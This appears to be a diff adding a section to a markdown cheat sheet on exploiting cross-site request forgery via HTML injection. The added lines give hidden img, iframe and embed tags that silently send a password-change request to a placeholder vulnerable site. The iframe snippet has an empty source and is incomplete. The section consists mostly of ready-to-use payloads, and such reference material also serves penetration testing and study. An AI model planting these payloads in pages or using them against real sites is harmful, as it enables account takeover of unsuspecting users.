@@ -35,3 +35,20 @@ Cookie: session=cookievalues
 
 password=newpass&comfirm_password=newpass
 ```
+
+**Exploit CSRF Vulnerability Via HTML Injections (GET Method)**
+
+>Using Image Tag
+```
+<img style="display:none;" src="http://target-vuln-web.com/user/new_password?password=newpass&comfirm_password=newpass">
+```
+
+>Using Iframe Tag
+```
+ <iframe src="" style="display:none;"></iframe> 
+```
+
+>Using Embed Tag
+```
+ <embed type="image/jpg" src="http://target-vuln-web.com/user/new_password?password=newpass&comfirm_password=newpass" style="display:none;"> 
+```
